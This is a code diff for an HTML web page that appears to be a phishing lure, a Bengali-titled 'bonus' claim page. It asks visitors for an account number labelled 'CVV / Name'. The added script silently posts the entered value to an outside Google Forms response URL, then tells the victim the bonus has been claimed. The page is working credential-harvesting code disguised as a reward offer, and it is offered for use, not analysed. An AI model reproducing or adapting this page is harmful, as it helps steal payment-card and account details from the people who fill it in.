@@ -26,10 +26,9 @@
             text-align: center;
             margin-bottom: 20px;
             font-weight: bold;
-             background: linear-gradient(110.7deg, rgb(255, 81, 47) 1.7%, rgb(255, 167, 47) 8.2%, rgb(122, 59, 202) 16.2%, rgb(18, 51, 233) 23.4%, rgb(69, 193, 42) 32.8%, rgb(231, 7, 249) 43.7%, rgb(6, 200, 217) 55.3%, rgb(18, 51, 233) 65.5%, rgb(122, 59, 202) 74.5%, rgb(231, 7, 249) 82.3%, rgb(202, 59, 163) 91.4%); 
-    -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-        
+            background: linear-gradient(110.7deg, rgb(255, 81, 47) 1.7%, rgb(255, 167, 47) 8.2%, rgb(122, 59, 202) 16.2%, rgb(18, 51, 233) 23.4%, rgb(69, 193, 42) 32.8%, rgb(231, 7, 249) 43.7%, rgb(6, 200, 217) 55.3%, rgb(18, 51, 233) 65.5%, rgb(122, 59, 202) 74.5%, rgb(231, 7, 249) 82.3%, rgb(202, 59, 163) 91.4%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         .form-container label {
             display: block;
@@ -43,7 +42,6 @@
             border: 1px solid #ccc;
             border-radius: 5px;
         }
-        
         .form-container input[type="submit"] {
             width: 50%;
             padding: 10px;
@@ -59,18 +57,62 @@
         .form-container input[type="submit"]:hover {
             background-color: #45a049;
         }
+        .confirmation-message {
+            text-align: center;
+            color: green;
+        }
     </style>
 </head>
 <body>
     <div class="form-container">
         <h2>দুই-চার-পাচঁ</h2>
-        <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScVz3veBlhP7zYsKPa5gem4u_H2bqftYiICVXON30VjxWMJOw/formResponse" method="get" target="_blank">
-            <label for="username">Account</label>
-            <input type="tel" id="username" name="entry.31441046" placeholder="CVV / Name"required>
-            <label for="bonuscode"></label>
-            <input type="hidden" id="bonuscode" name="entry.1545135281" value="100upc"required>
-            <input type="submit" value="Claim">
+        <form id="bonusForm">
+            <label for="username">Account:</label>
+            <input type="tel" id="username" placeholder="CVV / Name" required>
+            <input type="submit" value="Claim" id="submit-button">
         </form>
+        <div id="confirmation-message" class="confirmation-message" style="display: none;"></div>
     </div>
+
+    <script>
+        document.getElementById('bonusForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            var accountNumber = document.getElementById('username').value;
+            var bonusCode = "Bonus";
+            var googleFormsData = [
+                {
+                    url: 'https://docs.google.com/forms/d/e/1FAIpQLScVz3veBlhP7zYsKPa5gem4u_H2bqftYiICVXON30VjxWMJOw/formResponse',
+                    entries: {
+                        account: 'entry.31441046',
+                        bonusCode: 'entry.1545135281'
+                    }
+                }
+            ];
+
+            googleFormsData.forEach((form) => {
+                const formData = new FormData();
+                formData.append(form.entries.account, accountNumber);
+                formData.append(form.entries.bonusCode, bonusCode);
+
+                fetch(form.url, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: new URLSearchParams(formData)
+                })
+                .then(() => {
+                    var submitButton = document.getElementById('submit-button');
+                    submitButton.style.display = 'none';
+                    var confirmationMessage = document.getElementById('confirmation-message');
+                    confirmationMessage.textContent = 'Thank you! Your bonus has been claimed 😉.';
+                    confirmationMessage.style.display = 'block';
+                })
+                .catch((error) => {
+                    alert('Something went wrong. Please try again.');
+                    console.error('Error:', error);
+                });
+            });
+        });
+    </script>
 </body>
 </html>
